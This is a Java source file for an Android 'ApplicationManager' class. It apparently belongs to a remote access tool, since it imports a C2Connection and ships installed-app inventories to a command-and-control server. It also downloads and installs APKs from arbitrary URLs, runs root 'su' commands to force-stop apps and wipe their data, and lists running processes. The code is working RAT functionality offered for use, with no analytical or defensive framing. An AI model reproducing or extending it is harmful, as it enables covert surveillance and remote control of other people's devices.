package com.tarjon.admin.utils;

import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.Build;
import android.util.Base64;
import android.util.Log;

import androidx.core.content.FileProvider;

import com.tarjon.admin.db.DataStorage;
import com.tarjon.admin.network.C2Connection;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;

/**
 * Manages applications on the device including listing, installing,
 * uninstalling, and launching applications.
 */
public class ApplicationManager {

    private static final String TAG = "ApplicationManager";
    
    private Context context;
    private EncryptionManager encryptionManager;
    private DataStorage dataStorage;
    private C2Connection c2Connection;
    
    public ApplicationManager(Context context) {
        this.context = context;
        this.encryptionManager = new EncryptionManager();
        this.dataStorage = new DataStorage(context);
        this.c2Connection = new C2Connection(context, encryptionManager);
    }
    
    /**
     * Get list of all installed applications
     * @param includeSystemApps Whether to include system applications
     * @param includeAppIcons Whether to include app icons (Base64 encoded)
     * @return JSON array of installed applications
     */
    public String getInstalledApplications(boolean includeSystemApps, boolean includeAppIcons) {
        try {
            PackageManager pm = context.getPackageManager();
            List<PackageInfo> packages = pm.getInstalledPackages(0);
            
            // Sort apps alphabetically by name
            Collections.sort(packages, new Comparator<PackageInfo>() {
                @Override
                public int compare(PackageInfo p1, PackageInfo p2) {
                    String name1 = p1.applicationInfo.loadLabel(pm).toString();
                    String name2 = p2.applicationInfo.loadLabel(pm).toString();
                    return name1.compareToIgnoreCase(name2);
                }
            });
            
            JSONArray appsArray = new JSONArray();
            
            for (PackageInfo packageInfo : packages) {
                // Skip system apps if not requested
                if (!includeSystemApps && 
                    (packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0) {
                    continue;
                }
                
                JSONObject appInfo = new JSONObject();
                
                // Basic app info
                appInfo.put("package_name", packageInfo.packageName);
                appInfo.put("app_name", packageInfo.applicationInfo.loadLabel(pm).toString());
                appInfo.put("version_name", packageInfo.versionName);
                appInfo.put("version_code", packageInfo.versionCode);
                appInfo.put("first_install_time", packageInfo.firstInstallTime);
                appInfo.put("last_update_time", packageInfo.lastUpdateTime);
                
                // App type
                boolean isSystemApp = (packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
                appInfo.put("system_app", isSystemApp);
                
                // App status
                boolean isEnabled = packageInfo.applicationInfo.enabled;
                appInfo.put("enabled", isEnabled);
                
                // App permissions
                try {
                    String[] requestedPermissions = packageInfo.requestedPermissions;
                    if (requestedPermissions != null) {
                        JSONArray permissionsArray = new JSONArray();
                        for (String permission : requestedPermissions) {
                            permissionsArray.put(permission);
                        }
                        appInfo.put("permissions", permissionsArray);
                    }
                } catch (Exception e) {
                    appInfo.put("permissions", new JSONArray());
                }
                
                // App icon as Base64 (optional to reduce data size)
                if (includeAppIcons) {
                    try {
                        Drawable icon = packageInfo.applicationInfo.loadIcon(pm);
                        String base64Icon = drawableToBase64(icon);
                        appInfo.put("icon", base64Icon);
                    } catch (Exception e) {
                        Log.e(TAG, "Error encoding app icon: " + e.getMessage());
                        appInfo.put("icon", "");
                    }
                }
                
                // Add to array
                appsArray.put(appInfo);
            }
            
            // Send to C2 server
            String appsData = appsArray.toString();
            c2Connection.sendInstalledApps(appsData);
            
            return appsData;
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting installed applications: " + e.getMessage(), e);
            return "[]";
        }
    }
    
    /**
     * Launch an application by package name
     * @param packageName Package name of the application to launch
     * @return Success or error message
     */
    public String launchApplication(String packageName) {
        try {
            PackageManager pm = context.getPackageManager();
            Intent launchIntent = pm.getLaunchIntentForPackage(packageName);
            
            if (launchIntent != null) {
                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(launchIntent);
                return "Application launched: " + packageName;
            } else {
                return "Error: Application cannot be launched";
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error launching application: " + e.getMessage(), e);
            return "Error: " + e.getMessage();
        }
    }
    
    /**
     * Uninstall an application
     * @param packageName Package name of the application to uninstall
     * @return Success or error message
     */
    public String uninstallApplication(String packageName) {
        try {
            // For most apps, we need to launch the uninstall intent
            // This will prompt the user, we cannot silently uninstall without root
            Intent intent = new Intent(Intent.ACTION_DELETE);
            intent.setData(Uri.parse("package:" + packageName));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            
            return "Uninstall request sent for: " + packageName;
            
        } catch (Exception e) {
            Log.e(TAG, "Error uninstalling application: " + e.getMessage(), e);
            return "Error: " + e.getMessage();
        }
    }
    
    /**
     * Download and install an APK from a URL
     * @param apkUrl URL of the APK to download and install
     * @return Success or error message
     */
    public String installFromUrl(String apkUrl) {
        try {
            // Create a temporary file for the APK
            File outputFile = File.createTempFile("download", ".apk", context.getCacheDir());
            
            // Download the file
            URL url = new URL(apkUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.connect();
            
            if (connection.getResponseCode() != HttpURLConnection.HTTP_OK) {
                return "Error: Server returned HTTP " + connection.getResponseCode();
            }
            
            // Download the file with progress tracking
            int fileLength = connection.getContentLength();
            InputStream input = new BufferedInputStream(connection.getInputStream());
            FileOutputStream output = new FileOutputStream(outputFile);
            
            byte[] data = new byte[4096];
            long total = 0;
            int count;
            
            while ((count = input.read(data)) != -1) {
                total += count;
                output.write(data, 0, count);
            }
            
            output.flush();
            output.close();
            input.close();
            
            // Install the APK
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                // For Android 7.0 and above, we need to use FileProvider
                Uri apkUri = FileProvider.getUriForFile(
                        context,
                        context.getPackageName() + ".provider",
                        outputFile);
                
                Intent intent = new Intent(Intent.ACTION_INSTALL_PACKAGE);
                intent.setData(apkUri);
                intent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            } else {
                // For earlier versions
                Uri apkUri = Uri.fromFile(outputFile);
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(intent);
            }
            
            return "APK downloaded and installation started";
            
        } catch (Exception e) {
            Log.e(TAG, "Error installing from URL: " + e.getMessage(), e);
            return "Error: " + e.getMessage();
        }
    }
    
    /**
     * Get details for a specific application
     * @param packageName Package name of the application
     * @return JSON object with application details
     */
    public String getApplicationDetails(String packageName) {
        try {
            PackageManager pm = context.getPackageManager();
            PackageInfo packageInfo = pm.getPackageInfo(packageName, 
                    PackageManager.GET_PERMISSIONS | 
                    PackageManager.GET_ACTIVITIES | 
                    PackageManager.GET_SERVICES | 
                    PackageManager.GET_RECEIVERS);
            
            JSONObject appInfo = new JSONObject();
            
            // Basic app info
            appInfo.put("package_name", packageInfo.packageName);
            appInfo.put("app_name", packageInfo.applicationInfo.loadLabel(pm).toString());
            appInfo.put("version_name", packageInfo.versionName);
            appInfo.put("version_code", packageInfo.versionCode);
            appInfo.put("first_install_time", packageInfo.firstInstallTime);
            appInfo.put("last_update_time", packageInfo.lastUpdateTime);
            
            // App type
            boolean isSystemApp = (packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
            appInfo.put("system_app", isSystemApp);
            
            // App status
            boolean isEnabled = packageInfo.applicationInfo.enabled;
            appInfo.put("enabled", isEnabled);
            
            // Target SDK
            appInfo.put("target_sdk", packageInfo.applicationInfo.targetSdkVersion);
            
            // App paths
            appInfo.put("source_dir", packageInfo.applicationInfo.sourceDir);
            appInfo.put("data_dir", packageInfo.applicationInfo.dataDir);
            
            // App permissions
            try {
                String[] requestedPermissions = packageInfo.requestedPermissions;
                if (requestedPermissions != null) {
                    JSONArray permissionsArray = new JSONArray();
                    for (String permission : requestedPermissions) {
                        permissionsArray.put(permission);
                    }
                    appInfo.put("permissions", permissionsArray);
                } else {
                    appInfo.put("permissions", new JSONArray());
                }
            } catch (Exception e) {
                appInfo.put("permissions", new JSONArray());
            }
            
            // App activities
            if (packageInfo.activities != null) {
                JSONArray activitiesArray = new JSONArray();
                for (android.content.pm.ActivityInfo activity : packageInfo.activities) {
                    activitiesArray.put(activity.name);
                }
                appInfo.put("activities", activitiesArray);
            } else {
                appInfo.put("activities", new JSONArray());
            }
            
            // App services
            if (packageInfo.services != null) {
                JSONArray servicesArray = new JSONArray();
                for (android.content.pm.ServiceInfo service : packageInfo.services) {
                    servicesArray.put(service.name);
                }
                appInfo.put("services", servicesArray);
            } else {
                appInfo.put("services", new JSONArray());
            }
            
            // App receivers
            if (packageInfo.receivers != null) {
                JSONArray receiversArray = new JSONArray();
                for (android.content.pm.ActivityInfo receiver : packageInfo.receivers) {
                    receiversArray.put(receiver.name);
                }
                appInfo.put("receivers", receiversArray);
            } else {
                appInfo.put("receivers", new JSONArray());
            }
            
            // App icon as Base64
            try {
                Drawable icon = packageInfo.applicationInfo.loadIcon(pm);
                String base64Icon = drawableToBase64(icon);
                appInfo.put("icon", base64Icon);
            } catch (Exception e) {
                Log.e(TAG, "Error encoding app icon: " + e.getMessage());
                appInfo.put("icon", "");
            }
            
            return appInfo.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting application details: " + e.getMessage(), e);
            try {
                return new JSONObject().put("error", e.getMessage()).toString();
            } catch (Exception ex) {
                return "{\"error\": \"Unknown error\"}";
            }
        }
    }
    
    /**
     * Force stop an application (requires ROOT)
     * @param packageName Package name of the application to stop
     * @return Success or error message
     */
    public String forceStopApplication(String packageName) {
        try {
            // This requires root to work properly
            Process process = Runtime.getRuntime().exec(new String[]{"su", "-c", "am force-stop " + packageName});
            process.waitFor();
            
            if (process.exitValue() == 0) {
                return "Application force stopped: " + packageName;
            } else {
                return "Error: Could not force stop application (requires root)";
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Error force stopping application: " + e.getMessage(), e);
            return "Error: " + e.getMessage() + " (may require root)";
        }
    }
    
    /**
     * Clear application data
     * @param packageName Package name of the application
     * @return Success or error message
     */
    public String clearApplicationData(String packageName) {
        try {
            // Try using root command first
            try {
                Process process = Runtime.getRuntime().exec(new String[]{"su", "-c", "pm clear " + packageName});
                process.waitFor();
                
                if (process.exitValue() == 0) {
                    return "Application data cleared: " + packageName;
                }
            } catch (Exception e) {
                // Root not available, try non-root method
            }
            
            // Non-root method through intent (requires user interaction)
            Intent intent = new Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
            intent.setData(Uri.parse("package:" + packageName));
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            
            return "Opened app settings for: " + packageName + " (please clear data manually)";
            
        } catch (Exception e) {
            Log.e(TAG, "Error clearing application data: " + e.getMessage(), e);
            return "Error: " + e.getMessage();
        }
    }
    
    /**
     * Convert Drawable to Base64 encoded string
     */
    private String drawableToBase64(Drawable drawable) {
        try {
            // Convert drawable to bitmap
            Bitmap bitmap;
            if (drawable.getIntrinsicWidth() <= 0 || drawable.getIntrinsicHeight() <= 0) {
                bitmap = Bitmap.createBitmap(1, 1, Bitmap.Config.ARGB_8888);
            } else {
                bitmap = Bitmap.createBitmap(drawable.getIntrinsicWidth(), drawable.getIntrinsicHeight(), Bitmap.Config.ARGB_8888);
            }
            
            Canvas canvas = new Canvas(bitmap);
            drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
            drawable.draw(canvas);
            
            // Compress to byte array
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, byteArrayOutputStream);
            byte[] byteArray = byteArrayOutputStream.toByteArray();
            
            // Convert to Base64
            return Base64.encodeToString(byteArray, Base64.NO_WRAP);
            
        } catch (Exception e) {
            Log.e(TAG, "Error converting drawable to Base64: " + e.getMessage(), e);
            return "";
        }
    }
    
    /**
     * Get list of running applications and processes
     * @return JSON array with running processes
     */
    public String getRunningApplications() {
        try {
            ActivityManager activityManager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            List<ActivityManager.RunningAppProcessInfo> runningProcesses = activityManager.getRunningAppProcesses();
            
            JSONArray processesArray = new JSONArray();
            PackageManager pm = context.getPackageManager();
            
            for (ActivityManager.RunningAppProcessInfo processInfo : runningProcesses) {
                JSONObject process = new JSONObject();
                
                process.put("process_name", processInfo.processName);
                process.put("pid", processInfo.pid);
                process.put("uid", processInfo.uid);
                
                // Get packages associated with this process
                JSONArray packagesArray = new JSONArray();
                if (processInfo.pkgList != null) {
                    for (String packageName : processInfo.pkgList) {
                        try {
                            ApplicationInfo appInfo = pm.getApplicationInfo(packageName, 0);
                            String appName = appInfo.loadLabel(pm).toString();
                            
                            JSONObject packageInfo = new JSONObject();
                            packageInfo.put("package_name", packageName);
                            packageInfo.put("app_name", appName);
                            
                            packagesArray.put(packageInfo);
                        } catch (Exception e) {
                            // Skip this package
                        }
                    }
                }
                process.put("packages", packagesArray);
                
                // Get importance
                String importance;
                switch (processInfo.importance) {
                    case ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND:
                        importance = "foreground";
                        break;
                    case ActivityManager.RunningAppProcessInfo.IMPORTANCE_VISIBLE:
                        importance = "visible";
                        break;
                    case ActivityManager.RunningAppProcessInfo.IMPORTANCE_SERVICE:
                        importance = "service";
                        break;
                    case ActivityManager.RunningAppProcessInfo.IMPORTANCE_BACKGROUND:
                        importance = "background";
                        break;
                    case ActivityManager.RunningAppProcessInfo.IMPORTANCE_EMPTY:
                        importance = "empty";
                        break;
                    default:
                        importance = "unknown";
                }
                process.put("importance", importance);
                
                processesArray.put(process);
            }
            
            return processesArray.toString();
            
        } catch (Exception e) {
            Log.e(TAG, "Error getting running applications: " + e.getMessage(), e);
            return "[]";
        }
    }
}